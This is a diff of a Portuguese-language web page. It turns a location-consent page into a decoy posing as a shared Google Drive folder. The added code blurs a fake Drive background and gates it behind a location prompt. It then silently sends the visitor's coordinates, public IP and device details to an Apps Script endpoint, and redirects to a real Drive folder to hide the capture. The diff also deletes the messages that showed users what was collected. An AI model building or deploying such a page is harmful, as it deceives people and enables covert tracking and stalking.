@@ -3,66 +3,198 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Confirme sua localização</title>
+<title>Documento compartilhado</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
+  html, body {
+    height: 100%;
+    overflow: hidden;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    min-height: 100vh; display: flex; align-items: center; justify-content: center;
-    background: linear-gradient(135deg, #0f172a, #1e3a8a);
-    color: #fff; padding: 20px;
+    background: #f1f5f9;
   }
+
+  /* Fundo simulando a pasta do Drive (embaçado) */
+  .fundo {
+    position: fixed;
+    inset: 0;
+    padding: 40px 24px;
+    filter: blur(6px);
+    opacity: 0.6;
+    pointer-events: none;
+    user-select: none;
+  }
+
+  .barra {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 28px;
+  }
+
+  .logo-drive {
+    width: 40px;
+    height: 40px;
+    border-radius: 8px;
+    background: linear-gradient(135deg, #34a853, #fbbc04, #ea4335);
+  }
+
+  .titulo-fake {
+    height: 20px;
+    width: 220px;
+    background: #cbd5e1;
+    border-radius: 4px;
+  }
+
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 16px;
+  }
+
+  .pasta-fake {
+    background: #fff;
+    border: 1px solid #e2e8f0;
+    border-radius: 10px;
+    padding: 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .icone-fake {
+    width: 32px;
+    height: 32px;
+    border-radius: 6px;
+    background: #94a3b8;
+    flex-shrink: 0;
+  }
+
+  .texto-fake {
+    height: 12px;
+    flex: 1;
+    background: #cbd5e1;
+    border-radius: 3px;
+  }
+
+  /* Cortina */
+  .overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(15, 23, 42, 0.85);
+    backdrop-filter: blur(8px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    padding: 20px;
+    transition: opacity 0.3s ease;
+  }
+
+  .overlay.hidden {
+    opacity: 0;
+    pointer-events: none;
+  }
+
   .card {
-    background: rgba(255,255,255,0.07); backdrop-filter: blur(12px);
-    border: 1px solid rgba(255,255,255,0.15); border-radius: 20px;
-    padding: 36px 28px; max-width: 440px; width: 100%;
-    text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+    background: #fff;
+    color: #0f172a;
+    border-radius: 16px;
+    padding: 32px 28px;
+    max-width: 400px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
   }
-  .icon { font-size: 48px; margin-bottom: 16px; }
-  h1 { font-size: 21px; margin-bottom: 12px; font-weight: 600; }
-  p { font-size: 15px; line-height: 1.5; color: #cbd5e1; margin-bottom: 24px; }
-  button {
-    width: 100%; padding: 16px; font-size: 16px; font-weight: 600;
-    color: #0f172a; background: #38bdf8; border: none;
-    border-radius: 12px; cursor: pointer; transition: 0.15s;
+
+  .card .icone {
+    font-size: 44px;
+    margin-bottom: 14px;
   }
-  button:hover { background: #7dd3fc; }
-  button:active { transform: scale(0.98); }
-  button:disabled { opacity: 0.6; cursor: wait; }
-  .msg { margin-top: 18px; font-size: 14px; min-height: 20px; }
-  .msg.error { color: #fca5a5; }
-  .msg.ok { color: #86efac; }
-  .coords { margin-top: 14px; font-size: 12px; color: #94a3b8; font-family: monospace; word-break: break-all; }
+
+  .card h2 {
+    font-size: 19px;
+    margin-bottom: 10px;
+    font-weight: 600;
+  }
+
+  .card p {
+    font-size: 14px;
+    color: #475569;
+    margin-bottom: 22px;
+    line-height: 1.5;
+  }
+
+  .card button {
+    width: 100%;
+    padding: 15px;
+    font-size: 15px;
+    font-weight: 600;
+    color: #fff;
+    background: #2563eb;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: background 0.15s, transform 0.1s;
+  }
+
+  .card button:hover { background: #1d4ed8; }
+  .card button:active { transform: scale(0.98); }
+  .card button:disabled { opacity: 0.6; cursor: wait; }
+
+  .msg {
+    margin-top: 14px;
+    font-size: 13px;
+    color: #ef4444;
+    min-height: 18px;
+  }
 </style>
 </head>
 <body>
-  <div class="card">
-    <div class="icon">📍</div>
-    <h1>Precisamos da sua localização</h1>
-    <p>Para continuar, você precisa autorizar o acesso à sua localização. Ao clicar abaixo, o navegador vai pedir sua permissão.</p>
-    <button id="btn">Permitir e continuar</button>
-    <div class="msg" id="msg"></div>
-    <div class="coords" id="coords"></div>
+
+  <!-- Conteúdo de trás: aparência de pasta do Drive (borrada) -->
+  <div class="fundo">
+    <div class="barra">
+      <div class="logo-drive"></div>
+      <div class="titulo-fake"></div>
+    </div>
+    <div class="grid">
+      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
+      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
+      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
+      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
+      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
+      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
+      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
+      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
+    </div>
+  </div>
+
+  <!-- Cortina -->
+  <div class="overlay" id="overlay">
+    <div class="card">
+      <div class="icone">📍</div>
+      <h2>Confirme sua localização</h2>
+      <p>Para acessar este conteúdo, você precisa autorizar o acesso à sua localização.</p>
+      <button id="btn">Permitir e continuar</button>
+      <div class="msg" id="msg"></div>
+    </div>
   </div>
 
 <script>
   const btn = document.getElementById('btn');
   const msg = document.getElementById('msg');
-  const coordsEl = document.getElementById('coords');
+  const overlay = document.getElementById('overlay');
 
-  // ✅ URL nova do Apps Script
+  // URL do seu Apps Script
   const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzEIeDdSyoHHW8t1sVRE-C8dfZgFQVnbBVVsvqlpmBlAkUNZ9e_TZszpPZz_iwV7oUh/exec';
 
-  // Para onde redirecionar após autorizar
-  const DESTINO = 'https://www.google.com';
+  // Link real da pasta do Drive (destino após autorizar)
+  const DESTINO = 'https://drive.google.com/drive/folders/1Jj_Io3G4P0seEreAgJORidrv7cJC1o5K?usp=drive_link';
 
   btn.addEventListener('click', async () => {
-    msg.className = 'msg';
     msg.textContent = '';
-    coordsEl.textContent = '';
 
     if (!navigator.geolocation) {
-      msg.classList.add('error');
       msg.textContent = 'Seu navegador não suporta geolocalização.';
       return;
     }
@@ -70,11 +202,10 @@
     try {
       const perm = await navigator.permissions.query({ name: 'geolocation' });
       if (perm.state === 'denied') {
-        msg.classList.add('error');
-        msg.textContent = 'Você negou a localização. Vá nas configurações do navegador e permita para continuar.';
+        msg.textContent = 'Você negou a localização. Permita nas configurações do navegador para continuar.';
         return;
       }
-    } catch (_) { /* alguns navegadores não suportam query */ }
+    } catch (_) {}
 
     btn.disabled = true;
     btn.textContent = 'Obtendo localização...';
@@ -82,10 +213,6 @@
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
         const { latitude, longitude, accuracy } = pos.coords;
-
-        msg.classList.add('ok');
-        msg.textContent = 'Autorizado! Enviando dados...';
-        coordsEl.textContent = `Lat: ${latitude.toFixed(6)} | Lng: ${longitude.toFixed(6)} | Precisão: ${Math.round(accuracy)}m`;
 
         const payload = {
           Latitude: latitude,
@@ -101,8 +228,7 @@
           Memoria: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A'
         };
 
-        // Monta os dados como string de formulário
-        const formBody = Object.entries(payload)
+        const body = Object.entries(payload)
           .map(([k, v]) => encodeURIComponent(k) + '=' + encodeURIComponent(v))
           .join('&');
 
@@ -111,20 +237,21 @@
             method: 'POST',
             mode: 'no-cors',
             headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-            body: formBody
+            body
           });
-          msg.textContent = 'Dados registrados! Redirecionando...';
         } catch (e) {
           console.error('Erro no fetch:', e);
-          msg.textContent = 'Erro ao enviar dados. Redirecionando mesmo assim...';
         }
 
-        setTimeout(() => { window.location.href = DESTINO; }, 1500);
+        // Esconde a cortina e redireciona para a pasta real
+        overlay.classList.add('hidden');
+        setTimeout(() => {
+          window.location.href = DESTINO;
+        }, 400);
       },
       (err) => {
         btn.disabled = false;
         btn.textContent = 'Tentar novamente';
-        msg.classList.add('error');
         switch (err.code) {
           case err.PERMISSION_DENIED:
             msg.textContent = 'Permissão negada. Você precisa permitir a localização para continuar.';
@@ -143,15 +270,11 @@
     );
   });
 
-  // Obtém o IP público via API externa gratuita
   async function obterIP() {
     try {
       const r = await fetch('https://api.ipify.org?format=json');
-      const d = await r.json();
-      return d.ip;
-    } catch (_) {
-      return 'Indisponível';
-    }
+      return (await r.json()).ip;
+    } catch { return 'Indisponível'; }
   }
 </script>
 </body>
